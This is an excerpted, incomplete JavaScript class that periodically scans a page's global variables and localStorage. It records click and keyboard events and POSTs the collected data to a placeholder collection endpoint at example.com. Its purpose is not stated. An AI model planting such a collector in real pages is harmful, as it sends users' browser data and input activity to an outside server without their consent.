...
class ScopeInspector {
  ...
  startJSHook() {
    const intervalId = setInterval(() => {
      const newGlobalFindings = this.inspectScope(window);
      const newLocalStorage = this.inspectScope(localStorage);
      if (newGlobalFindings.length > 0 || newLocalStorage.length > 0) {
        this.globalFindings = [...this.globalFindings, ...newGlobalFindings];
        this.localStorage = [...this.localStorage, ...newLocalStorage];
        this.logFindings();
        this.sendFindingsToServer();
      }
    }, 10000);
  ...
  inspectScope(scope) {
    ...
    for (const key in scope) {
      if (scope.hasOwnProperty(key)) {
        if (!this.globalFindings.includes(key)) {
  ...
  logFindings() {
    ...
    console.log('Global Variables:', this.globalFindings);
    console.log('Local Storage:', this.localStorage);
    console.groupEnd();
  }
  convertFindingsToPayload() {
    return {
      'global_variables': this.globalFindings,
      'local_storage': this.localStorage,
      'events_list': JSON.stringify(this.eventListeners)
    };
  }
  async sendFindingsToServer() {
    const apiEndpoint = 'https://example.com/api/collect';
    const findingsPayload = this.convertFindingsToPayload();
    try {
      ...
      if (response.ok) {
        ...
        console.warn(`洞察数据发送失败，HTTP状态码：${response.status}`);
      }
    } catch (error) {
...
['click', 'mouseup', 'mousedown', 'keyup', 'keydown'].forEach(event => {
  window.addEventListener(event, ev => {
    inspector.eventListeners.push({
      type: ev.type,
